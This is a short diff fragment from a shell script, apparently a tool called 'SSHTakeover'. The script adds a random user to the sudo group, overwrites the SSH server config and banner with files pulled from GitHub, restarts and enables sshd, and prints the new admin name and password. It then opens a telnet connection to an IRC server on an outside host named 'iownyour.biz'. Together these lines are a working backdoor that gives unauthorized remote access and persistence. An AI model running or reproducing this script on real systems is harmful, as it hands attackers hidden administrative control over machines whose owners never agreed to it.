@@ -15,8 +15,8 @@ if [ -f /usr/bin/apt ]; then usermod -g sudo $random_user; fi;
 echo Configuring SSH...;
 if [ ! -f ./sshd_banner ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_banner -o /etc/ssh/sshd_banner; else cp -r ./sshd_banner /etc/ssh/sshd_banner; fi;
 if [ ! -f ./sshd_config ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config -o /etc/ssh/sshd_config; else cp -r ./sshd_config /etc/ssh/sshd_config; fi;
-if [ -f /usr/bin/yum ]; then service sshd start && systemctl enable sshd; fi;
-if [ -f /usr/bin/apt ]; then service ssh start && systemctl enable ssh; fi;
+if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
+if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
 arr4y="Added admin:, $random_user, password:, $random_number, Start SSHd with: sudo service ssh start (debian) or sudo service sshd start (centos)";
 echo $arr4y;
 telnet irc-3.iownyour.biz 6667
